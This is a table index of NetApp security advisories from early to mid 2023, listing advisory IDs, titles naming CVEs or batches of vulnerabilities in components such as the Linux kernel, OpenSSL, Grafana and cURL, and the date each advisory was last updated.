| [**NTAP-20230616-0006**](https://security.netapp.com/advisory/ntap-20230616-0006/) | CVE-2023-32305 PostgreSQL Vulnerability in NetApp Products | 2023-06-16 |
| [**NTAP-20230609-0010**](https://security.netapp.com/advisory/ntap-20230609-0010/) | CVE-2021-31239 SQLite Vulnerability in NetApp Products | 2023-12-20 |
| [**NTAP-20230609-0003**](https://security.netapp.com/advisory/ntap-20230609-0003/) | CVE-2023-1387 Grafana Vulnerability in NetApp Products | 2023-06-09 |
| [**NTAP-20230609-0004**](https://security.netapp.com/advisory/ntap-20230609-0004/) | CVE-2023-2006 Linux Kernel Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20230609-0005**](https://security.netapp.com/advisory/ntap-20230609-0005/) | CVE-2023-2176 Linux Kernel Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230609-0007**](https://security.netapp.com/advisory/ntap-20230609-0007/) | CVE-2023-2197 HashiCorp Vault Vulnerability in NetApp Products | 2023-06-09 |
| [**NTAP-20230609-0002**](https://security.netapp.com/advisory/ntap-20230609-0002/) | CVE-2023-2235 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20230609-0008**](https://security.netapp.com/advisory/ntap-20230609-0008/) | CVE-2023-31047 Django Vulnerability in NetApp Products | 2023-06-09 |
| [**NTAP-20230609-0001**](https://security.netapp.com/advisory/ntap-20230609-0001/) | CVE-2023-31436 Linux Kernel Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230609-0009**](https://security.netapp.com/advisory/ntap-20230609-0009/) | May 2023 cURL/libcURL Vulnerabilities in NetApp Products | 2024-06-03 |
| [**NTAP-20230609-0006**](https://security.netapp.com/advisory/ntap-20230609-0006/) | May 2023 NGINX Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20230601-0006**](https://security.netapp.com/advisory/ntap-20230601-0006/) | April 2023 Libxml2 Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20230601-0005**](https://security.netapp.com/advisory/ntap-20230601-0005/) | CVE-2022-21216 Intel Processor Vulnerability in NetApp Products | 2024-02-07 |
| [**NTAP-20230601-0001**](https://security.netapp.com/advisory/ntap-20230601-0001/) | CVE-2023-1829 Linux Kernel Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230601-0002**](https://security.netapp.com/advisory/ntap-20230601-0002/) | CVE-2023-1872 Linux Kernel Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230601-0004**](https://security.netapp.com/advisory/ntap-20230601-0004/) | CVE-2023-1989 Linux Kernel Vulnerability in NetApp Products | 2023-08-01 |
| [**NTAP-20230601-0009**](https://security.netapp.com/advisory/ntap-20230601-0009/) | CVE-2023-20873 Spring Boot Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20230601-0010**](https://security.netapp.com/advisory/ntap-20230601-0010/) | CVE-2023-2236 Linux Kernel Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230601-0003**](https://security.netapp.com/advisory/ntap-20230601-0003/) | CVE-2023-27043 Python Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230601-0007**](https://security.netapp.com/advisory/ntap-20230601-0007/) | CVE-2023-28856 Redis Vulnerability in NetApp Products | 2023-10-09 |
| [**NTAP-20230601-0008**](https://security.netapp.com/advisory/ntap-20230601-0008/) | CVE-2023-30846 Node.js Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230526-0001**](https://security.netapp.com/advisory/ntap-20230526-0001/) | April 2023 Eclipse Jetty Vulnerabilities in NetApp Products | 2024-07-19 |
| [**NTAP-20230526-0007**](https://security.netapp.com/advisory/ntap-20230526-0007/) | April 2023 Golang Vulnerabilities in NetApp Products | 2024-01-16 |
| [**NTAP-20230526-0005**](https://security.netapp.com/advisory/ntap-20230526-0005/) | CVE-2020-24736 SQLite Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230526-0009**](https://security.netapp.com/advisory/ntap-20230526-0009/) | CVE-2022-4744 Linux Kernel Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230526-0010**](https://security.netapp.com/advisory/ntap-20230526-0010/) | CVE-2023-1670 Linux Kernel Vulnerability in NetApp Products | 2023-09-18 |
| [**NTAP-20230526-0002**](https://security.netapp.com/advisory/ntap-20230526-0002/) | CVE-2023-20862 Spring Security Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20230526-0003**](https://security.netapp.com/advisory/ntap-20230526-0003/) | CVE-2023-28755 Ruby Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20230526-0004**](https://security.netapp.com/advisory/ntap-20230526-0004/) | CVE-2023-28756 Ruby Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20230526-0006**](https://security.netapp.com/advisory/ntap-20230526-0006/) | CVE-2023-29323 OpenBSD Vulnerability in NetApp Products | 2023-05-26 |
| [**NTAP-20230526-0008**](https://security.netapp.com/advisory/ntap-20230526-0008/) | March 2023 Hashicorp Vault Vulnerabilities in NetApp Products | 2023-05-26 |
| [**NTAP-20230525-0001**](https://security.netapp.com/advisory/ntap-20230525-0001/) | CVE-2023-27311 Information Disclosure Vulnerability in NetApp BlueXP Connector | 2023-05-25 |
| [**NTAP-20230517-0006**](https://security.netapp.com/advisory/ntap-20230517-0006/) | CVE-2021-46880 LibreSSL Vulnerability in NetApp Products | 2023-09-11 |
| [**NTAP-20230517-0002**](https://security.netapp.com/advisory/ntap-20230517-0002/) | CVE-2023-0210 Linux Kernel Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230517-0005**](https://security.netapp.com/advisory/ntap-20230517-0005/) | CVE-2023-0664 QEMU Vulnerability in NetApp Products | 2023-05-17 |
| [**NTAP-20230517-0003**](https://security.netapp.com/advisory/ntap-20230517-0003/) | CVE-2023-1838 Linux Kernel Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230517-0007**](https://security.netapp.com/advisory/ntap-20230517-0007/) | CVE-2023-2008 Linux Kernel Vulnerability in NetApp Products | 2023-08-01 |
| [**NTAP-20230517-0010**](https://security.netapp.com/advisory/ntap-20230517-0010/) | CVE-2023-26463 strongSwan Vulnerability in NetApp Products | 2023-05-17 |
| [**NTAP-20230517-0004**](https://security.netapp.com/advisory/ntap-20230517-0004/) | CVE-2023-28464 Linux Kernel Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230517-0008**](https://security.netapp.com/advisory/ntap-20230517-0008/) | CVE-2023-29013 Golang Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20230517-0009**](https://security.netapp.com/advisory/ntap-20230517-0009/) | CVE-2023-29491 GNU Ncurses Vulnerability in NetApp Products | 2023-11-15 |
| [**NTAP-20230517-0001**](https://security.netapp.com/advisory/ntap-20230517-0001/) | February 2023 PHP Vulnerabilities in NetApp Products | 2023-09-05 |
| [**NTAP-20230511-0010**](https://security.netapp.com/advisory/ntap-20230511-0010/) | April 2023 IBM DB2 Vulnerabilities in NetApp Products | 2023-05-11 |
| [**NTAP-20230511-0004**](https://security.netapp.com/advisory/ntap-20230511-0004/) | CVE-2022-3162 Kubernetes Vulnerability in NetApp Products | 2024-03-15 |
| [**NTAP-20230511-0003**](https://security.netapp.com/advisory/ntap-20230511-0003/) | CVE-2023-0179 Linux Kernel Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230511-0002**](https://security.netapp.com/advisory/ntap-20230511-0002/) | CVE-2023-1077 Linux Kernel Vulnerability in NetApp Products | 2024-09-05 |
| [**NTAP-20230511-0011**](https://security.netapp.com/advisory/ntap-20230511-0011/) | CVE-2023-1096 Authentication Bypass Vulnerability in SnapCenter | 2023-05-11 |
| [**NTAP-20230511-0001**](https://security.netapp.com/advisory/ntap-20230511-0001/) | CVE-2023-1380 Linux Kernel Vulnerability in NetApp Products | 2023-05-11 |
| [**NTAP-20230511-0005**](https://security.netapp.com/advisory/ntap-20230511-0005/) | CVE-2023-1544 QEMU Vulnerability in NetApp Products | 2023-05-11 |
| [**NTAP-20230511-0008**](https://security.netapp.com/advisory/ntap-20230511-0008/) | CVE-2023-1550 NGINX Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20230511-0009**](https://security.netapp.com/advisory/ntap-20230511-0009/) | CVE-2023-1579 GNU Binutils Vulnerability in NetApp Products | 2024-04-05 |
| [**NTAP-20230511-0006**](https://security.netapp.com/advisory/ntap-20230511-0006/) | CVE-2023-1652 Linux Kernel Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230511-0007**](https://security.netapp.com/advisory/ntap-20230511-0007/) | CVE-2023-30456 Linux Kernel Vulnerability in NetApp Products | 2023-06-06 |
| [**NTAP-20230505-0010**](https://security.netapp.com/advisory/ntap-20230505-0010/) | CVE-2022-3116 Heimdal Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20230505-0007**](https://security.netapp.com/advisory/ntap-20230505-0007/) | CVE-2022-3294 Kubernetes Vulnerability in NetApp Products | 2023-05-05 |
| [**NTAP-20230505-0003**](https://security.netapp.com/advisory/ntap-20230505-0003/) | CVE-2022-48423 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230505-0002**](https://security.netapp.com/advisory/ntap-20230505-0002/) | CVE-2022-48424 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230505-0004**](https://security.netapp.com/advisory/ntap-20230505-0004/) | CVE-2023-1078 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230505-0005**](https://security.netapp.com/advisory/ntap-20230505-0005/) | CVE-2023-1252 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230505-0006**](https://security.netapp.com/advisory/ntap-20230505-0006/) | CVE-2023-20860 Spring Framework Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20230505-0001**](https://security.netapp.com/advisory/ntap-20230505-0001/) | CVE-2023-24999 HashiCorp Vault Vulnerability in NetApp Products | 2023-05-05 |
| [**NTAP-20230505-0008**](https://security.netapp.com/advisory/ntap-20230505-0008/) | CVE-2023-26464 Apache Log4j Vulnerability in NetApp Products | 2023-05-26 |
| [**NTAP-20230505-0009**](https://security.netapp.com/advisory/ntap-20230505-0009/) | CVE-2023-26604 Systemd Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230427-0008**](https://security.netapp.com/advisory/ntap-20230427-0008/) | April 2023 Java Platform Standard Edition Vulnerabilities in NetApp Products | 2024-12-06 |
| [**NTAP-20230427-0007**](https://security.netapp.com/advisory/ntap-20230427-0007/) | April 2023 MySQL Server Vulnerabilities in NetApp Products | 2024-05-17 |
| [**NTAP-20230427-0012**](https://security.netapp.com/advisory/ntap-20230427-0012/) | CVE-2021-39537 GNU Ncurses Vulnerability in NetApp Products | 2024-02-23 |
| [**NTAP-20230427-0011**](https://security.netapp.com/advisory/ntap-20230427-0011/) | CVE-2022-0812 Linux Kernel Vulnerability in NetApp Products | 2023-08-08 |
| [**NTAP-20230427-0002**](https://security.netapp.com/advisory/ntap-20230427-0002/) | CVE-2022-41862 PostgreSQL Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230427-0009**](https://security.netapp.com/advisory/ntap-20230427-0009/) | CVE-2023-0215 MySQL Connector/ODBC Vulnerability in NetApp Products | 2024-03-11 |
| [**NTAP-20230427-0001**](https://security.netapp.com/advisory/ntap-20230427-0001/) | CVE-2023-0482 RESTEasy Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230427-0004**](https://security.netapp.com/advisory/ntap-20230427-0004/) | CVE-2023-1281 Linux Kernel Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230427-0010**](https://security.netapp.com/advisory/ntap-20230427-0010/) | CVE-2023-21971 MySQL Connector/J Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230427-0003**](https://security.netapp.com/advisory/ntap-20230427-0003/) | CVE-2023-27475 Golang Vulnerability in NetApp Products | 2023-05-12 |
| [**NTAP-20230427-0006**](https://security.netapp.com/advisory/ntap-20230427-0006/) | CVE-2023-28466 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230427-0005**](https://security.netapp.com/advisory/ntap-20230427-0005/) | CVE-2023-28772 Linux Kernel Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20230426-0001**](https://security.netapp.com/advisory/ntap-20230426-0001/) | CVE-2023-29552 Service Location Protocol Vulnerability in NetApp Products | 2023-04-27 |
| [**NTAP-20230420-0009**](https://security.netapp.com/advisory/ntap-20230420-0009/) | CVE-2016-1000027 Spring Framework Vulnerability in NetApp Products | 2023-11-01 |
| [**NTAP-20230420-0008**](https://security.netapp.com/advisory/ntap-20230420-0008/) | CVE-2022-2097 MySQL Server Vulnerability in NetApp Products | 2024-02-21 |
| [**NTAP-20230420-0005**](https://security.netapp.com/advisory/ntap-20230420-0005/) | CVE-2022-4095 Linux Kernel Vulnerability in NetApp Products | 2023-05-05 |
| [**NTAP-20230420-0004**](https://security.netapp.com/advisory/ntap-20230420-0004/) | CVE-2023-0386 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230420-0001**](https://security.netapp.com/advisory/ntap-20230420-0001/) | CVE-2023-1390 Linux Kernel Vulnerability in NetApp Products | 2023-05-26 |
| [**NTAP-20230420-0003**](https://security.netapp.com/advisory/ntap-20230420-0003/) | CVE-2023-1410 Grafana Vulnerability in NetApp Products | 2023-04-20 |
| [**NTAP-20230420-0007**](https://security.netapp.com/advisory/ntap-20230420-0007/) | CVE-2023-20861 Spring Framework Vulnerability in NetApp Products | 2023-12-08 |
| [**NTAP-20230420-0006**](https://security.netapp.com/advisory/ntap-20230420-0006/) | CVE-2023-27490 Node.js Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230420-0011**](https://security.netapp.com/advisory/ntap-20230420-0011/) | CVE-2023-27533 cURL/libcURL Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230420-0012**](https://security.netapp.com/advisory/ntap-20230420-0012/) | CVE-2023-27534 cURL/libcURL Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230420-0010**](https://security.netapp.com/advisory/ntap-20230420-0010/) | March 2023 cURL/libcURL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20230420-0002**](https://security.netapp.com/advisory/ntap-20230420-0002/) | March 2023 Sudo Vulnerabilities in NetApp Products | 2023-05-22 |
| [**NTAP-20230414-0001**](https://security.netapp.com/advisory/ntap-20230414-0001/) | March 2023 OpenSSL Vulnerabilities in NetApp Products | 2024-11-11 |
| [**NTAP-20230413-0006**](https://security.netapp.com/advisory/ntap-20230413-0006/) | CVE-2022-48425 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230413-0010**](https://security.netapp.com/advisory/ntap-20230413-0010/) | CVE-2023-0030 Linux Kernel Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230413-0001**](https://security.netapp.com/advisory/ntap-20230413-0001/) | CVE-2023-0507 Grafana Vulnerability in NetApp Products | 2023-04-13 |
| [**NTAP-20230413-0003**](https://security.netapp.com/advisory/ntap-20230413-0003/) | CVE-2023-1118 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230413-0004**](https://security.netapp.com/advisory/ntap-20230413-0004/) | CVE-2023-22462 Grafana Vulnerability in NetApp Products | 2023-04-13 |
| [**NTAP-20230413-0002**](https://security.netapp.com/advisory/ntap-20230413-0002/) | CVE-2023-26053 Gradle Vulnerability in NetApp Products | 2023-10-03 |
| [**NTAP-20230413-0009**](https://security.netapp.com/advisory/ntap-20230413-0009/) | CVE-2023-27320 Sudo Vulnerability in NetApp Products | 2023-08-22 |
| [**NTAP-20230413-0007**](https://security.netapp.com/advisory/ntap-20230413-0007/) | CVE-2023-28155 Node.js Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230413-0005**](https://security.netapp.com/advisory/ntap-20230413-0005/) | CVE-2023-28425 Redis Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230413-0008**](https://security.netapp.com/advisory/ntap-20230413-0008/) | CVE-2023-28531 OpenSSH Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230406-0003**](https://security.netapp.com/advisory/ntap-20230406-0003/) | CVE-2021-36713 jQuery Vulnerability in NetApp Products | 2024-01-02 |
| [**NTAP-20230406-0005**](https://security.netapp.com/advisory/ntap-20230406-0005/) | CVE-2022-3424 Linux Kernel Vulnerabilities in NetApp Products | 2023-04-20 |
| [**NTAP-20230406-0004**](https://security.netapp.com/advisory/ntap-20230406-0004/) | CVE-2022-3857 Libpng Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230406-0006**](https://security.netapp.com/advisory/ntap-20230406-0006/) | CVE-2023-0464 OpenSSL Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20230406-0002**](https://security.netapp.com/advisory/ntap-20230406-0002/) | CVE-2023-26242 Linux Kernel Vulnerability in NetApp Products | 2023-04-20 |
| [**NTAP-20230406-0001**](https://security.netapp.com/advisory/ntap-20230406-0001/) | CVE-2023-27567 OpenBSD Vulnerability in NetApp Products | 2023-07-07 |
| [**NTAP-20230406-0007**](https://security.netapp.com/advisory/ntap-20230406-0007/) | March 2023 Samba Vulnerabilities in NetApp Products | 2023-04-06 |
| [**NTAP-20230331-0005**](https://security.netapp.com/advisory/ntap-20230331-0005/) | CVE-2021-20251 Samba Vulnerability in NetApp Products | 2023-03-31 |
| [**NTAP-20230331-0010**](https://security.netapp.com/advisory/ntap-20230331-0010/) | CVE-2022-41723 Golang Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230331-0001**](https://security.netapp.com/advisory/ntap-20230331-0001/) | CVE-2022-4645 LibTIFF Vulnerability in NetApp Products | 2023-03-31 |
| [**NTAP-20230331-0006**](https://security.netapp.com/advisory/ntap-20230331-0006/) | CVE-2023-0461 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230331-0008**](https://security.netapp.com/advisory/ntap-20230331-0008/) | CVE-2023-0567 PHP Vulnerabilities in NetApp Products | 2023-05-18 |
| [**NTAP-20230331-0007**](https://security.netapp.com/advisory/ntap-20230331-0007/) | CVE-2023-0594 Grafana Vulnerability in NetApp Products | 2023-03-31 |
| [**NTAP-20230331-0003**](https://security.netapp.com/advisory/ntap-20230331-0003/) | CVE-2023-23003 Linux Kernel Vulnerability in NetApp Products | 2023-10-04 |
| [**NTAP-20230331-0011**](https://security.netapp.com/advisory/ntap-20230331-0011/) | CVE-2023-24532 Golang Vulnerability in NetApp Products | 2024-01-24 |
| [**NTAP-20230331-0012**](https://security.netapp.com/advisory/ntap-20230331-0012/) | CVE-2023-28708 Apache Tomcat Vulnerability in NetApp Products | 2023-06-27 |
| [**NTAP-20230331-0009**](https://security.netapp.com/advisory/ntap-20230331-0009/) | February 2023 Golang Vulnerabilities in NetApp Products | 2023-12-20 |
| [**NTAP-20230331-0004**](https://security.netapp.com/advisory/ntap-20230331-0004/) | Februray 2023 Linux Kernel 5.16 Vulnerabilities in NetApp Products | 2023-05-16 |
| [**NTAP-20230331-0002**](https://security.netapp.com/advisory/ntap-20230331-0002/) | March 2023 Redis Vulnerabilities in NetApp Products | 2023-04-04 |
| [**NTAP-20230324-0006**](https://security.netapp.com/advisory/ntap-20230324-0006/) | CVE-2020-12403 Libnss Vulnerability in NetApp Products | 2023-03-24 |
| [**NTAP-20230324-0001**](https://security.netapp.com/advisory/ntap-20230324-0001/) | CVE-2022-3219 GnuPG Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230324-0002**](https://security.netapp.com/advisory/ntap-20230324-0002/) | CVE-2022-4492 Undertow Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20230324-0003**](https://security.netapp.com/advisory/ntap-20230324-0003/) | CVE-2022-48282 MongoDB Vulnerability in NetApp Products | 2023-03-24 |
| [**NTAP-20230324-0005**](https://security.netapp.com/advisory/ntap-20230324-0005/) | CVE-2023-0361 GNU TLS Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20230324-0008**](https://security.netapp.com/advisory/ntap-20230324-0008/) | CVE-2023-0767 Libnss Vulnerability in NetApp Products | 2023-11-30 |
| [**NTAP-20230324-0009**](https://security.netapp.com/advisory/ntap-20230324-0009/) | CVE-2023-0804 LibTIFF Vulnerabilities in NetApp Products | 2023-03-28 |
| [**NTAP-20230324-0007**](https://security.netapp.com/advisory/ntap-20230324-0007/) | CVE-2023-23931 Cryptography Project Vulnerability in NetApp Products | 2023-12-14 |
| [**NTAP-20230324-0004**](https://security.netapp.com/advisory/ntap-20230324-0004/) | CVE-2023-24329 Python Vulnerability in NetApp Products | 2024-04-25 |
| [**NTAP-20230324-0010**](https://security.netapp.com/advisory/ntap-20230324-0010/) | CVE-2023-24807 Node.js Vulnerability in NetApp Products | 2023-04-20 |
| [**NTAP-20230316-0005**](https://security.netapp.com/advisory/ntap-20230316-0005/) | CVE-2006-20001 Apache HTTP Server Vulnerability in NetApp Products | 2023-04-20 |
| [**NTAP-20230316-0011**](https://security.netapp.com/advisory/ntap-20230316-0011/) | CVE-2022-47629 Libksba Vulnerability in NetApp Products | 2024-05-15 |
| [**NTAP-20230316-0001**](https://security.netapp.com/advisory/ntap-20230316-0001/) | CVE-2023-0240 Linux Kernel Vulnerability in NetApp Products | 2023-04-20 |
| [**NTAP-20230316-0004**](https://security.netapp.com/advisory/ntap-20230316-0004/) | CVE-2023-0751 FreeBSD Vulnerability in NetApp Products | 2023-03-16 |
| [**NTAP-20230316-0006**](https://security.netapp.com/advisory/ntap-20230316-0006/) | CVE-2023-24580 Django Vulnerability in NetApp Products | 2023-03-16 |
| [**NTAP-20230316-0009**](https://security.netapp.com/advisory/ntap-20230316-0009/) | CVE-2023-26545 Linux Kernel Vulnerability in NetApp Products | 2023-05-19 |
| [**NTAP-20230316-0002**](https://security.netapp.com/advisory/ntap-20230316-0002/) | February 2023 LibTIFF Vulnerabilities in NetApp Products | 2023-03-16 |
| [**NTAP-20230316-0010**](https://security.netapp.com/advisory/ntap-20230316-0010/) | February 2023 Linux Kernel 6.0.8 Vulnerabilities in NetApp Products | 2023-05-16 |
| [**NTAP-20230316-0008**](https://security.netapp.com/advisory/ntap-20230316-0008/) | February 2023 Node.js Vulnerabilities in NetApp Products | 2023-05-19 |
| [**NTAP-20230316-0007**](https://security.netapp.com/advisory/ntap-20230316-0007/) | March 2023 Apache HTTP Server Vulnerabilities in NetApp Products | 2023-09-19 |
| [**NTAP-20230316-0003**](https://security.netapp.com/advisory/ntap-20230316-0003/) | March 2023 LibTIFF Vulnerabilities in NetApp Products | 2023-03-16 |
| [**NTAP-20230314-0001**](https://security.netapp.com/advisory/ntap-20230314-0001/) | March 2023 Trusted Platform Module 2.0 Vulnerabilities in NetApp Products | 2023-03-14 |
| [**NTAP-20230309-0002**](https://security.netapp.com/advisory/ntap-20230309-0002/) | CVE-2018-1000802 Python Vulnerability in NetApp Products | 2023-09-11 |
| [**NTAP-20230309-0007**](https://security.netapp.com/advisory/ntap-20230309-0007/) | CVE-2022-23498 Grafana Vulnerability in NetApp Products | 2023-03-09 |
| [**NTAP-20230309-0001**](https://security.netapp.com/advisory/ntap-20230309-0001/) | CVE-2022-27536 Golang Vulnerability in NetApp Products | 2023-05-12 |
| [**NTAP-20230309-0008**](https://security.netapp.com/advisory/ntap-20230309-0008/) | CVE-2022-37708 Docker Vulnerability in NetApp Products | 2023-05-24 |
| [**NTAP-20230309-0010**](https://security.netapp.com/advisory/ntap-20230309-0010/) | CVE-2022-39324 Grafana Vulnerability in NetApp Products | 2023-03-09 |
| [**NTAP-20230309-0004**](https://security.netapp.com/advisory/ntap-20230309-0004/) | CVE-2022-4139 Linux Kernel Vulnerability in NetApp Products | 2023-05-16 |
| [**NTAP-20230309-0009**](https://security.netapp.com/advisory/ntap-20230309-0009/) | CVE-2022-47015 MariaDB Vulnerability in NetApp Products | 2023-03-09 |
| [**NTAP-20230309-0005**](https://security.netapp.com/advisory/ntap-20230309-0005/) | CVE-2023-22474 Node.js Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230309-0003**](https://security.netapp.com/advisory/ntap-20230309-0003/) | CVE-2023-25136 OpenSSH Vulnerability in NetApp Products | 2024-11-05 |
| [**NTAP-20230309-0006**](https://security.netapp.com/advisory/ntap-20230309-0006/) | February 2023 cURL/libcURL Vulnerabilities in NetApp Products | 2024-04-25 |
| [**NTAP-20230302-0008**](https://security.netapp.com/advisory/ntap-20230302-0008/) | CVE-2022-23552 Grafana Vulnerability in NetApp Products | 2023-03-02 |
| [**NTAP-20230302-0012**](https://security.netapp.com/advisory/ntap-20230302-0012/) | CVE-2022-33972 Intel Processor Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20230302-0004**](https://security.netapp.com/advisory/ntap-20230302-0004/) | CVE-2022-48281 LibTIFF Vulnerability in NetApp Products | 2023-03-02 |
| [**NTAP-20230302-0002**](https://security.netapp.com/advisory/ntap-20230302-0002/) | CVE-2023-0122 Linux Kernel Vulnerability in NetApp Products | 2023-03-13 |
| [**NTAP-20230302-0001**](https://security.netapp.com/advisory/ntap-20230302-0001/) | CVE-2023-22602 Apache Shiro Vulnerability in NetApp Products | 2023-03-02 |
| [**NTAP-20230302-0003**](https://security.netapp.com/advisory/ntap-20230302-0003/) | CVE-2023-23559 Linux Kernel Vulnerability in NetApp Products | 2023-03-13 |
| [**NTAP-20230302-0007**](https://security.netapp.com/advisory/ntap-20230302-0007/) | CVE-2023-23969 Django Vulnerability in NetApp Products | 2023-03-02 |
| [**NTAP-20230302-0013**](https://security.netapp.com/advisory/ntap-20230302-0013/) | CVE-2023-24998 Apache Commons FileUpload Vulnerability in NetApp Products | 2024-11-11 |
| [**NTAP-20230302-0010**](https://security.netapp.com/advisory/ntap-20230302-0010/) | CVE-2023-25139 GNU C Library (glibc) Vulnerability in NetApp Products | 2023-10-24 |
| [**NTAP-20230302-0009**](https://security.netapp.com/advisory/ntap-20230302-0009/) | February 2023 IBM DB2 Vulnerabilities in NetApp Products | 2023-03-13 |
| [**NTAP-20230302-0011**](https://security.netapp.com/advisory/ntap-20230302-0011/) | Intel SA-00717 BIOS Firmware Vulnerabilities in NetApp Products | 2024-01-16 |
| [**NTAP-20230302-0005**](https://security.netapp.com/advisory/ntap-20230302-0005/) | January 2023 Linux Kernel 6.1 Vulnerabilities in NetApp Products | 2024-07-30 |
| [**NTAP-20230302-0006**](https://security.netapp.com/advisory/ntap-20230302-0006/) | January 2023 Redis Vulnerabilities in NetApp Products | 2023-03-28 |
| [**NTAP-20230228-0001**](https://security.netapp.com/advisory/ntap-20230228-0001/) | CVE-2022-38734 Denial of Service Vulnerability in StorageGRID (formerly StorageGRID Webscale) | 2023-02-28 |
| [**NTAP-20230223-0008**](https://security.netapp.com/advisory/ntap-20230223-0008/) | CVE-2018-14628 Samba Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230223-0002**](https://security.netapp.com/advisory/ntap-20230223-0002/) | CVE-2022-2196 Linux Kernel Vulnerability in NetApp Products | 2023-03-13 |
| [**NTAP-20230223-0010**](https://security.netapp.com/advisory/ntap-20230223-0010/) | CVE-2022-23491 Python-Certifi Vulnerability in NetApp Products | 2024-01-16 |
| [**NTAP-20230223-0007**](https://security.netapp.com/advisory/ntap-20230223-0007/) | CVE-2022-31631 PHP Vulnerability in NetApp Products | 2023-02-23 |
| [**NTAP-20230223-0005**](https://security.netapp.com/advisory/ntap-20230223-0005/) | CVE-2022-3977 Linux Kernel Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230223-0006**](https://security.netapp.com/advisory/ntap-20230223-0006/) | CVE-2022-41858 Linux Kernel Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230223-0001**](https://security.netapp.com/advisory/ntap-20230223-0001/) | CVE-2022-42898 MIT Kerberos 5 Vulnerability in NetApp Products | 2024-08-30 |
| [**NTAP-20230223-0004**](https://security.netapp.com/advisory/ntap-20230223-0004/) | CVE-2022-4379 Linux Kernel Vulnerability in NetApp Products | 2024-05-20 |
| [**NTAP-20230223-0003**](https://security.netapp.com/advisory/ntap-20230223-0003/) | CVE-2022-4696 Linux Kernel Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230223-0009**](https://security.netapp.com/advisory/ntap-20230223-0009/) | January 2023 ISC BIND Vulnerabilities in NetApp Products | 2023-11-22 |
| [**NTAP-20230223-0011**](https://security.netapp.com/advisory/ntap-20230223-0011/) | November 2022 Net-SNMP Vulnerabilities in NetApp Products | 2023-08-21 |
| [**NTAP-20230216-0001**](https://security.netapp.com/advisory/ntap-20230216-0001/) | CVE-2017-1000158 Python Vulnerability in NetApp Products | 2023-04-20 |
| [**NTAP-20230216-0003**](https://security.netapp.com/advisory/ntap-20230216-0003/) | CVE-2022-3176 Linux Kernel Vulnerability in NetApp Products | 2023-03-14 |
| [**NTAP-20230216-0005**](https://security.netapp.com/advisory/ntap-20230216-0005/) | CVE-2022-41966 XStream Vulnerability in NetApp Products | 2023-02-16 |
| [**NTAP-20230216-0010**](https://security.netapp.com/advisory/ntap-20230216-0010/) | CVE-2022-4415 Systemd Vulnerability in NetApp Products | 2024-03-07 |
| [**NTAP-20230216-0009**](https://security.netapp.com/advisory/ntap-20230216-0009/) | CVE-2022-45143 Apache Tomcat Vulnerability in NetApp Products | 2023-05-22 |
| [**NTAP-20230216-0006**](https://security.netapp.com/advisory/ntap-20230216-0006/) | CVE-2022-47943 Linux Kernel Vulnerability in NetApp Products | 2023-03-14 |
